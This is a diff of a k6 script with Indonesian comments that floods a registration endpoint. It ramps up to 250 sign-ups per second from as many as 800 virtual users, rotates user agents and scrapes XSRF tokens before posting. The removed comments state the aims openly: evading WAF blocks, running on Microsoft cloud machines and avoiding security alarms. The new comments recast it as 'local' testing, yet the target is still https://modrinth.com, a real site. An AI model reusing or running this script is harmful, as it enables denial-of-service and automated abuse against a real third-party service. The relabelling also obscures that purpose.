@@ -1,23 +1,23 @@
 import http from 'k6/http';
 import { check, sleep } from 'k6';
 
-// 1. SKENARIO AGRESIF BERGELOMBANG (Membagi Beban Agar Bebas Blokir WAF)
+// 1. SKENARIO AGRESIF BERGELOMBANG (Uji Beban Maksimal Server Lokal)
 export const options = {
   scenarios: {
     stealth_cloud_flood: {
       executor: 'ramping-arrival-rate',
       startRate: 10,           // Detik awal: 10 pendaftaran per detik
       timeUnit: '1s',
-      preAllocatedVUs: 50,     // Menyiapkan 50 Virtual Users awal di memori server Microsoft
-      maxVUs: 800,             // Batas maksimal hingga 800 mesin virtual paralel (Sangat Berat!)
+      preAllocatedVUs: 50,     // Menyiapkan 50 Virtual Users awal di memori
+      maxVUs: 800,             // Batas maksimal hingga 800 mesin paralel
       stages: [
         { duration: '30s', target: 80 },  // Naik cepat ke 80 pendaftaran/detik dalam 30 detik
         { duration: '1m', target: 250 },  // Hantaman Ekstrem: 250 pendaftaran/detik di menit pertama!
-        { duration: '30s', target: 0 },   // Menurunkan trafik secara alami agar tidak memicu alarm keamanan permanen
+        { duration: '30s', target: 0 },   // Menurunkan trafik secara alami kembali ke nol
       ],
     },
   },
-  discardResponseBodies: true, // Menghemat pemrosesan data server agar performa k6 tetap maksimal
+  discardResponseBodies: true, // Menghemat pemrosesan data agar performa komputer tetap maksimal
 };
 
 // Fungsi pembuat string data acak unik
@@ -44,21 +44,34 @@ const listUserAgents = [
 ];
 
 export default function () {
-  // <--- GANTI LINK INI DENGAN ENDPOINT POST/TARGET YANG INGIN KAMU UJI --->
+  // <--- GANTI LINK INI DENGAN ENDPOINT TARGET LOKAL ANDA (Misal: http://localhost:8080/register) --->
   const url = 'https://modrinth.com'; 
 
-  // --- TAHAP 1: PENCURIAN TOKEN SEGAR AUTOMATIS (SENYAP) ---
+  // --- TAHAP 1: PENCURIAN TOKEN SEGAR AUTOMATIS (Pencegahan Crash) ---
   const getParams = {
     headers: {
       'User-Agent': listUserAgents[Math.floor(Math.random() * listUserAgents.length)],
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     },
+    timeout: '3s', // Batasi waktu tunggu agar tidak menggantung jika server lokal mulai lambat
   };
   
   const getRes = http.get(url, getParams);
   const cookieJar = http.cookieJar();
-  const cookies = cookieJar.getCookies(url);
-  const xsrfToken = cookies['XSRF-TOKEN'];
+  
+  let xsrfToken = null;
+  
+  // PENANGANAN KESALAHAN (Error Handling): Memastikan cookieJar ada sebelum mengambil datanya
+  if (cookieJar && typeof cookieJar.getCookies === 'function') {
+    try {
+      const cookies = cookieJar.getCookies(url);
+      if (cookies && cookies['XSRF-TOKEN']) {
+        xsrfToken = cookies['XSRF-TOKEN'];
+      }
+    } catch (e) {
+      // Jika gagal mengambil cookie karena server down/timeout, abaikan dan lanjut ke tahap 2
+    }
+  }
 
   // --- TAHAP 2: EKSEKUSI PENDAFTARAN KOMPLEKS (AGRESIF) ---
   const payload = JSON.stringify({
